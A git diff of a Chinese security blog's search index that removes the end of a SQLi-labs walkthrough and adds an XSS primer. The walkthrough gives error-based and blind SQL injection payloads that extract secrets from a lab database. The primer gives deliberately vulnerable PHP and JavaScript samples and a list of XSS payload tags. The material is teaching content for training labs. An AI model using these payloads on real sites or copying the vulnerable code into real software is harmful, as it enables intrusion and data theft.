-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306153106710.png" alt="image-20210306153106710"></p>
-<p>拿到 secret key 值为：J1rzyGdPRiKwK5I4iaNlCwuT</p>
-<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>($id)</code></p>
-<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>这一关和 Less-54 相比只是闭合方式换成了<code>(&#39;$id&#39;)</code>，给了14次机会。</p>
-<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>&quot;$id&quot;</code></p>
-<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>这一关只给了5次机会，当然如果知道了要使用什么注入方法后也能绰绰有余</p>
-<ul>
-<li>查看代码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$unames</span>=<span class="keyword">array</span>(<span class="string">&quot;Dumb&quot;</span>,<span class="string">&quot;Angelina&quot;</span>,<span class="string">&quot;Dummy&quot;</span>,<span class="string">&quot;secure&quot;</span>,<span class="string">&quot;stupid&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;batman&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;dhakkan&quot;</span>,<span class="string">&quot;admin4&quot;</span>);</span><br><span class="line"><span class="variable">$pass</span> = (<span class="variable">$unames</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name : &#x27;</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password : &#x27;</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br></pre></td></tr></table></figure>
-<p>这里查询成功只给你回显预定数组里面的数据，并不是直接回显查询结果，因此无法使用联合注入，我们可以尝试报错注入。</p>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>这里再演示一次报错注入：</p>
-<ul>
-<li>查询表名</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)))--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155346027.png" alt="image-20210306155346027"></p>
-<p>得知表名为：7dvdblb1tl</p>
-<ul>
-<li>查询字段名</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name+SEPARATOR+0x3c62723e) from information_schema.columns where table_name&#x3D;&#39;7dvdblb1tl&#39;),0x7e)))--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155750151.png" alt="image-20210306155750151"></p>
-<p>由于报错注入回显的字符数有限，如果想要后面的信息，可以加 limit 来限制数量</p>
-<p>这我们已经可以知道想要的字段名为：secret_UPZ7</p>
-<ul>
-<li>查询数据</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select secret_UPZ7 from 7dvdblb1tl),0x7e)))--+</span><br></pre></td></tr></table></figure>
-<p>得到 secret key 为： JrOfRpU234sYeim4AJuv6zVw</p>
-<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>本关与 Less-58 的思路一样，只是参数的数据类型换成了数字型。</p>
-<h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>(&quot;$id&quot;)</code>。</p>
-<h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>((&#39;$id&#39;))</code>。</p>
-<h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>这一关把错误信息显示也屏蔽了，因此只能使用盲注了，由于盲注需要尝试的步骤也比较多，因此这里也给出了130次的机会。同时应该注意到这里的闭合方式为<code>(&#39;$id&#39;)</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-62&#x2F;index.php&#x2F;?id&#x3D;1&#39;) and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) ,1,1))) &gt; 1--+</span><br></pre></td></tr></table></figure>
-<p>这里给出sqlmap的结果，注意如果已经运行过一次的话第二次需要清除缓存和cookie</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--flush-session --fresh-queries</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306172703280.png" alt="image-20210306172703280"></p>
-<h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>&#39;$id&#39;</code></p>
-<h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(($id))</code></p>
-<h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(&quot;$di&quot;)</code></p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
-</ul>
-<ul>
-<li><a class="link"   href="https://www.cnblogs.com/lcamry/" >lcamry 大佬的《MySQL注入天书》<i class="fas fa-external-link-alt"></i></a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
       </categories>
       <tags>
         <tag>SQL注入</tag>
@@ -801,23 +801,6 @@
       <tags>
         <tag>XSS</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2020/12/18/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
-]]></content>
-      <categories>
-        <category>杂谈</category>
-      </categories>
   </entry>
   <entry>
     <title>同源策略</title>
@@ -993,6 +976,23 @@
       </tags>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/2020/12/18/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>杂谈</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CSP策略与绕过</title>
     <url>/2021/03/24/CSP%E7%AD%96%E7%95%A5%E4%B8%8E%E7%BB%95%E8%BF%87/</url>
     <content><![CDATA[<h1 id="CSP策略与绕过"><a href="#CSP策略与绕过" class="headerlink" title="CSP策略与绕过"></a>CSP策略与绕过</h1><p>之前在同源策略中提到过CSP，也就是内容安全策略。CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。合理地配置好CSP能够避免绝大部分的XSS攻击。</p>
@@ -1018,7 +1018,7 @@
 <li><strong>style-src</strong> ：定义页面中CSS样式的有效来源</li>
 <li><strong>script-src</strong> ：定义页面中javascript有效来源</li>
 <li><strong>worker-src</strong>：限制Worker、SharedWorker或者ServiceWorker脚本源。</li>
-<li>**manifest-src **： 限制应用声明文件的源地址。</li>
+<li><strong>manifest-src</strong>： 限制应用声明文件的源地址。</li>
 <li><strong>frame-src：</strong> 设置允许通过类似<code>&lt;frame&gt;</code>和<code>&lt;iframe&gt;</code>标签加载的内嵌内容的源地址。</li>
 <li><strong>default-src</strong>：定义了那些没有被更精确指令指定的安全策略。</li>
 </ul>
@@ -2661,6 +2661,251 @@
       </categories>
       <tags>
         <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XSS总结</title>
+    <url>/2021/03/24/XSS%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h1 id="XSS总结"><a href="#XSS总结" class="headerlink" title="XSS总结"></a>XSS总结</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，比较合适的方式应该叫做跨站脚本攻击。</p>
+<p>跨站脚本攻击是一种常见的web安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶意代码等行为。</p>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>XSS漏洞可能会给网站带来以下的一些危害：</p>
+<ol>
+<li>网络钓鱼，盗取用户的账号</li>
+<li>获取用户的cookie信息，其中可能存在 Session ID 等信息，攻击者可以利用这些信息冒充用户登陆服务器。</li>
+<li>劫持用户浏览器，强制弹窗，转跳刷流量。</li>
+<li>攻击者能够在一定限度内记录用户的键盘输入。</li>
+<li>攻击者通过CSRF等方式以用户身份执行危险操作。</li>
+<li>获取客户端隐私信息。</li>
+<li>XSS蠕虫。</li>
+<li>利用XSS漏洞扫描用户内网。</li>
+</ol>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号 <code>&lt;</code> 被看作是HTML标签的开始，之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，<strong>当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行</strong>。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。</p>
+<p>example:（反射型）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line">&lt;title&gt;XSS原理重现&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xss_input&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$xss &#x3D; $_GET[&#39;xss_input&#39;];</span><br><span class="line">echo &#39;你输入的字符为&lt;br&gt;&#39;.$xss;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>这里我们通过GET方法把<code>xss_input</code>参数到后端，后端没有对该参数做任何检查就把该参数显示出来。</p>
+<p>当我们提交这样一段数据：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>浏览器就会把这一段内容当成HTML标签解析，导致里面的 JS 语句被执行，而不是当作文本输出。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308102212318.png" alt="image-20210308102212318"></p>
+<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>反射型跨站脚本（Reflected Cross-site Scripting）也称作非持久型、参数型跨站脚本。反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。</p>
+<p>简介中的 example 就是一个简单的反射型XSS漏洞模板</p>
+<p>我们查看页面元素可以看到我们输入的内容被当作了HTML标签执行。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308102914047.png" alt="image-20210308102914047"></p>
+<p>由于反射型XSS需要用户访问该连接才能实现，因此容易被有安全意识的用户发现，因此攻击者可以利用短网址或者二维码这样的方式来进行障眼法，避免含有攻击代码的URL直接暴露在用户的面前。</p>
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型跨站脚本（Stored Cross-site Scripting）也叫持久型XSS，意思是用户提交的数据会被存储在后端（不管是数据库、内存还是文件系统等），当攻击者提交的包含有XSS攻击的代码被存储在后端中，其他用户访问该页面的时候，后端会将数据取出来显示在页面上，这时候用户就会受到XSS攻击，最典型的应用是留言板。</p>
+<p>example：</p>
+<ul>
+<li>首先我们本地新建一个名字叫做<code>xss</code>的数据库，里面新建一个<code>message</code>表，用来存放用户的留言信息，字段名分别是<code>id</code>、<code>username</code>、<code>message</code></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">NAMES</span> utf8mb4;</span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`message`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`message`</span>  (</span><br><span class="line">                            <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">                            <span class="string">`username`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">                            <span class="string">`message`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">                            PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>) <span class="keyword">USING</span> BTREE</span><br><span class="line">) <span class="keyword">ENGINE</span> = MyISAM AUTO_INCREMENT = <span class="number">17</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8 <span class="keyword">COLLATE</span> = utf8_general_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>然后是后端页面</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$db_host &#x3D; &quot;localhost&quot;;</span><br><span class="line">$db_user &#x3D; &quot;root&quot;;</span><br><span class="line">$db_passwd &#x3D; &quot;&quot;;</span><br><span class="line">$db_dbname &#x3D; &quot;xss&quot;;</span><br><span class="line">$conn &#x3D; new mysqli($db_host, $db_user, $db_passwd, $db_dbname);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 前端用户输入表单 --&gt;</span><br><span class="line">&lt;h1&gt;留言板的存储型XSS&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;form  method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; placeholder&#x3D;&quot;姓名&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;message&quot; placeholder&#x3D;&quot;请输入您的留言&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;*直接将留言插入到数据库中*&#x2F;</span><br><span class="line">$username&#x3D;$_POST[&#39;username&#39;];</span><br><span class="line">$message&#x3D;$_POST[&#39;message&#39;];</span><br><span class="line">if($username and $message)</span><br><span class="line">&#123;</span><br><span class="line">    $sql&#x3D;&quot;INSERT INTO xss.message (&#96;username&#96;, &#96;message&#96;) VALUES (&#39;&#123;$username&#125;&#39;,&#39;&#123;$message&#125;&#39;)&quot;;</span><br><span class="line">    if ($conn-&gt;query($sql) &#x3D;&#x3D;&#x3D; TRUE) &#123;</span><br><span class="line">        echo &quot;留言成功&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;请填写完整信息&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*查询数据库中的留言信息*&#x2F;</span><br><span class="line">$sql &#x3D; &quot;SELECT username, message FROM xss.message&quot;;</span><br><span class="line">$result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">    while($row &#x3D; $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">        echo &quot;用户名：&quot; . $row[&quot;username&quot;]. &quot;留言内容:&quot; . $row[&quot;message&quot;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;暂无留言&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308114155994.png" alt="image-20210308114155994"></p>
+<p>当我们构造<code>&lt;script&gt;alert(11)&lt;\script&gt;</code>输入，然后查看数据库</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308114329338.png" alt="image-20210308114329338"></p>
+<p>发现我们的JS攻击语句已经被存储到数据库中。</p>
+<p>当用户访问该页面的时候就会执行该JS语句，再察看页面元素，发现HTML标签被解析出来。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308115104242.png" alt="image-20210308115104242"></p>
+<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。它和反射型XSS、存储型XSS的差别在于，DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。</p>
+<p>example:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;DOM Based XSS Demo&lt;&#x2F;title&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function xsstest()</span><br><span class="line">&#123;</span><br><span class="line">    var str &#x3D; document.getElementById(&quot;input&quot;).value;</span><br><span class="line">    document.getElementById(&quot;output&quot;).innerHTML &#x3D; &quot;&lt;img src&#x3D;&#39;&quot;+str+&quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;output&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;input&quot; size&#x3D;50 value&#x3D;&quot;&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;submit&quot; onclick&#x3D;&quot;xsstest()&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>功能很简单，用户输入框插入图片地址后，页面会将图片插入在 id=”output” 的 div 标签中，从而显示在网页上。</p>
+<p>当攻击者输入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x&#39; onerror&#x3D;&#39;javascript:alert(&#x2F;xss&#x2F;)</span><br></pre></td></tr></table></figure>
+<p>会直接在 img 标签中加入 onerror 事件，该事件是当图片加载出错时执行的语句，当我们输入无效的 src 地址导致图片加载出错时就会触发事件，从而实现弹窗效果。</p>
+<h2 id="XSS常用标签"><a href="#XSS常用标签" class="headerlink" title="XSS常用标签"></a>XSS常用标签</h2><h3 id="script"><a href="#script" class="headerlink" title="script"></a>script</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span>alert(&quot;xss&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="img"><a href="#img" class="headerlink" title="img"></a>img</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="input"><a href="#input" class="headerlink" title="input"></a>input</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="details"><a href="#details" class="headerlink" title="details"></a>details</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="svg"><a href="#svg" class="headerlink" title="svg"></a>svg</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="video-audio"><a href="#video-audio" class="headerlink" title="video/audio"></a>video/audio</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="a"><a href="#a" class="headerlink" title="a"></a>a</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="form"><a href="#form" class="headerlink" title="form"></a>form</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="XSS常见注入方式"><a href="#XSS常见注入方式" class="headerlink" title="XSS常见注入方式"></a>XSS常见注入方式</h2><ul>
+<li>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</li>
+<li>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</li>
